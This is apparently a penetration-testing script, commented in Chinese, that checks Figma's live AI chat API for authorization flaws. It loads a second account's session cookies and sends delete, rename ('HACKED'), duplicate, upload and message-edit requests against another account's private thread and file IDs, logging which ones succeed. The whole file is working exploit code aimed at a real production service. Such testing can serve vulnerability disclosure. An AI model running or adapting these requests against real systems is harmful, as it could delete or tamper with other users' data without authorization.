# -*- coding: utf-8 -*-
"""AI 线程级写接口越权矩阵: B(无注入) 对 A 的文件线程操作
目标: 删除/改名/复制线程、附件上传初始化 任一 200 = 独立越权写
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_PRIV_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_PUB_MAKE = "QooNP4ZnOkwGbudKlPX635"
A_THREAD_PRIV = "d14cc0e2-7766-468f-88d5-875f5efaf4c3"   # A 私有 make 的线程
A_THREAD_PUB = None
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, method, path, body=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": BC}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:220]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:220]}")
        return e.code, raw


T = A_THREAD_PRIV
print(f"===== B(无注入) 对 A 私有 make 线程 {T} 的写操作 =====")
call("delete_thread", "DELETE", f"/api/ai_chat/threads/{T}/delete")
call("rename_thread", "POST", f"/api/ai_chat/threads/{T}/title", {"title": "HACKED"})
call("duplicate_thread", "POST", f"/api/ai_chat/threads/{T}/duplicate", {})
call("dup2", "POST", f"/api/ai_chat/threads/{T}/duplicate",
     {"owner_id": A_PRIV_MAKE, "owner_type": "file"})
call("attachments", "POST", f"/api/ai_chat/threads/{T}/attachments", {})
call("blob_init", "POST", f"/api/ai_chat/{A_PRIV_MAKE}/message_content_blobs/x/init_uploads", {})
call("update_msg", "POST", f"/api/ai_chat/messages/{T}", {})
call("set_seq", "POST", f"/api/ai_chat/messages/{T}/set_end_file_seq_num", {"end_file_seq_num": 999})
call("compressions", "POST", "/api/ai_chat/compressions", {})
call("make_versions_update", "POST", f"/api/ai_chat/{A_PRIV_MAKE}/make_versions/{T}/update", {})
call("make_versions_import", "POST", f"/api/ai_chat/{A_PRIV_MAKE}/make_versions/{T}/import", {})
call("insert_template", "POST", f"/api/ai_chat/{A_PRIV_MAKE}/threads/{T}/insert_template", {})
call("message_parts", "POST", "/api/ai_chat/message_parts/probe", {})
call("del_message_parts", "DELETE", "/api/ai_chat/message_parts/probe/delete")
